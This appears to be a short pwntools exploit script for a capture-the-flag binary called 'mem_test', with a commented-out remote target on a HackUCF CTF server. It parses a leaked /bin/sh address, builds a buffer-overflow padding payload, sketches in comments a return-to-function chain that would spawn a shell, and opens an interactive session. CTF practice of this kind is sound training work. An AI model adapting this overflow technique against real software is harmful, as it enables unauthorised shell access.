#!/bin/python3
from pwn import *

p = process('./mem_test')
# p = remote('ctf.hackucf.org', 9004)
e = ELF('./mem_test')
r = ROP('./mem_test')


p.recvuntil(b'-\n\n')
randString = p.recvuntil(b'\n').rstrip()

p.recvuntil(b' : ')
binshAddress = int(p.recvuntil(b'\n').rstrip(), 16)


offset = 0x2c - 0x15

payload = b'A'*offset
# payload += p32(0x0804941a)
# payload += p32(e.sym['win_func'])
# payload += b'B'*4 # get to params
# payload += p32(binshAddress)

with open('payload', 'wb') as fout:
	fout.write(payload)


p.sendline(randString)
p.interactive()
